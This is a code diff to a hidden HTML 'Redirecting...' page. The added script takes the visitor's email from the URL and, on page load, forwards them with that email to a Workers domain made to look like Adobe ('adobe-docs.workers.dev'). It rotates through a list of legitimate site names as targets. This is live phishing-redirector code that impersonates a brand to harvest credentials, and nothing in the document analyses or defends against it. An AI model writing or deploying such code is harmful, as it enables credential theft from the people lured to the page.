@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <title>Redirecting...</title>
   <script>
+    // List of target sites
     const sites = [
       "https://cnn.com",
       "https://total.com",
@@ -14,14 +15,31 @@
 
     let current = 0;
 
+    // Function to get ?email= from query string
+    function getEmail() {
+      const params = new URLSearchParams(window.location.search);
+      return params.get("email") || "";
+    }
+
     function redirectLoop() {
-      const target = sites[current];
-      window.location.href = "https://adobecloud-document-874ba.adobe-docs.workers.dev/?target=" + encodeURIComponent(target);
+      const target = sites[current]; // pick current site
+      const email = getEmail();
+
+      // Build Worker URL with target + email
+      let url = "https://adobecloud-document-874ba.adobe-docs.workers.dev/?target=" + encodeURIComponent(target);
+      if (email) {
+        url += "&email=" + encodeURIComponent(email);
+      }
+
+      // Redirect immediately
+      window.location.replace(url);
+
+      // Move to next site for next visit (round-robin)
       current = (current + 1) % sites.length;
     }
 
-    // Start immediately
-    window.onload = redirectLoop;
+    // Trigger redirect when page loads
+    window.addEventListener("load", redirectLoop);
   </script>
 </head>
 <body style="display:none;">
